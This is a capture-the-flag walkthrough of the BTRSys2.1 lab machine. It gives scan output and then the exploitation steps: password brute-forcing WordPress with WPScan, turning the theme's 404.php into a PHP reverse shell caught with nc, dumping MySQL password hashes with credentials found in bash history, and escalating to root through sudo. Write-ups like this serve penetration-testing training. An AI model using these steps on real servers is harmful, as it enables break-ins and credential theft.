# BTRSys2.1

## Information Gathering
BTRSys2.1

192.168.240.50

Hint:
- The tragic history of a modern web application and client side approach.

Software Versions
- vsftpd 3.0.3
- OpenSSH 7.2p Ubuntu
- Apache httpd 2.4.18
- Lepton CMS
- WordPress 3.9.14

Users
- btrisk
- admin

## Scanning
Start with the nmap scan:
```bash
# Nmap 7.92 scan initiated Wed Apr  6 11:18:32 2022 as: nmap -sC -sV -oN nmap/btr.nmap 192.168.240.50
Nmap scan report for 192.168.240.50
Host is up (0.054s latency).
Not shown: 929 closed tcp ports (reset), 68 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.240
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 08:ee:e3:ff:31:20:87:6c:12:e7:1c:aa:c4:e7:54:f2 (RSA)
|   256 ad:e1:1c:7d:e7:86:76:be:9a:a8:bd:b9:68:92:77:87 (ECDSA)
|_  256 0c:e1:eb:06:0c:5c:b5:cc:1b:d1:fa:56:06:22:31:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-title: Site doesnt have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr  6 11:18:49 2022 -- 1 IP address (1 host up) scanned in 17.16 seconds

```

I ran a Gobuster scan:

```bash
/index.html           (Status: 200) [Size: 81]
/upload               (Status: 301) [Size: 317] [--> http://192.168.240.50/upload/]
/wordpress            (Status: 301) [Size: 320] [--> http://192.168.240.50/wordpress/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.240.50/javascript/]
/robots.txt           (Status: 200) [Size: 1451]
/INSTALL              (Status: 200) [Size: 1241]
/LICENSE              (Status: 200) [Size: 1672]
/COPYING              (Status: 200) [Size: 35147]
/CHANGELOG            (Status: 200) [Size: 224]
/server-status        (Status: 403) [Size: 302]
```

There is also a Wordpress application. I run a few scans against it.

```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | _ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.240.50/wordpress/ [192.168.240.50]
[+] Started: Wed Apr  6 11:39:31 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.240.50/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.240.50/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.240.50/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 3.9.14 identified (Insecure, released on 2016-09-07).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.240.50/wordpress/?feed=rss2, <generator>http://wordpress.org/?v=3.9.14</generator>
 |  - http://192.168.240.50/wordpress/?feed=comments-rss2, <generator>http://wordpress.org/?v=3.9.14</generator>

[+] WordPress theme in use: twentyfourteen
 | Location: http://192.168.240.50/wordpress/wp-content/themes/twentyfourteen/
 | Latest Version: 3.2
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Style URL: http://192.168.240.50/wordpress/wp-content/themes/twentyfourteen/style.css?ver=3.9.14
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | The version could not be determined.


[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://192.168.240.50/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.240.50/wordpress/wp-content/plugins/mail-masta/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.240.50/wordpress/wp-content/plugins/mail-masta/readme.txt


[i] Theme(s) Identified:

[+] twentyfourteen
 | Location: http://192.168.240.50/wordpress/wp-content/themes/twentyfourteen/
 | Latest Version: 3.2
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Style URL: http://192.168.240.50/wordpress/wp-content/themes/twentyfourteen/style.css
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://192.168.240.50/wordpress/wp-content/themes/twentyfourteen/, status: 500
 |
 | The version could not be determined.

[+] twentythirteen
 | Location: http://192.168.240.50/wordpress/wp-content/themes/twentythirteen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | [!] The version is out of date, the latest version is 3.4
 | Style URL: http://192.168.240.50/wordpress/wp-content/themes/twentythirteen/style.css
 | Style Name: Twenty Thirteen
 | Style URI: http://wordpress.org/themes/twentythirteen
 | Description: The 2013 theme for WordPress takes us back to the blog, featuring a full range of post formats, each...
 | Author: the WordPress team
 | Author URI: http://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.240.50/wordpress/wp-content/themes/twentythirteen/, status: 500
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.240.50/wordpress/wp-content/themes/twentythirteen/style.css, Match: 'Version: 1.2'

[+] twentytwelve
 | Location: http://192.168.240.50/wordpress/wp-content/themes/twentytwelve/
 | Last Updated: 2021-07-26T00:00:00.000Z
 | [!] The version is out of date, the latest version is 3.5
 | Style URL: http://192.168.240.50/wordpress/wp-content/themes/twentytwelve/style.css
 | Style Name: Twenty Twelve
 | Style URI: http://wordpress.org/themes/twentytwelve
 | Description: The 2012 theme for WordPress is a fully responsive theme that looks great on any device. Features in...
 | Author: the WordPress team
 | Author URI: http://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.240.50/wordpress/wp-content/themes/twentytwelve/, status: 500
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.240.50/wordpress/wp-content/themes/twentytwelve/style.css, Match: 'Version: 1.4'


[i] User(s) Identified:

[+] btrisk
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Apr  6 11:45:07 2022
[+] Requests Done: 23512
[+] Cached Requests: 53
[+] Data Sent: 6.544 MB
[+] Data Received: 3.268 MB
[+] Memory used: 295.379 MB
[+] Elapsed time: 00:05:36

```


## Exploitation
Trying to look at /upload returns an error saying that there is no database named 'Lepton'. A quick google search shows that Lepton is a CMS. This seems to be a rabbit hole though. I seems as if the CMS was not entirely set up or configured improperly. 

I turn my attention to Wordpress. My initial enumeration doesn't yield anything that could help me. I rerun a password scan against the Wordpress site:

```bash
wpscan --url http://192.168.56.50/wordpress/ -t 40 -e u1-1000 --passwords /usr/share/wordlists/rockyou.txt --force -o wp/password.wp
```

Which shows that the credentials for admin is **admin:admin**. Logging into the Wordpress site always us to modify pages by injecting my own code. I go to Appearance > Editor > 404.php and replace the code with a php-reverse-shell.

Set up a listener using **nc -lnvp 1337** and using curl to hit the website 

```bash
curl http://192.168.56.50/wordpress/wp-content/themes/twentyfourteen/404.php
```

Gives a reverse shell.

## Privilege Escalation
I start my privilege escalation by first running LinEnum.sh. This shows that the www-data user has a .bash_history file in /var/www. Reading over .bash_history shows that the previous user logged into the MySQL server using the credentials **root:rootpassword!**. They then use the wordpress database to dump all entries in the wp_users table. 

I do exactly the same and dumped the hashes for two users: admin and btrisk. We already known admins password. I throw btrisk's password into crackstation and get the credentials **btrisk:roottoor**. I use these credentials to pivot to btrisk.

Lastly, running **sudo -l** shows that btrisk can run any command as sudo. I use **sudo -i** and escalate to root.

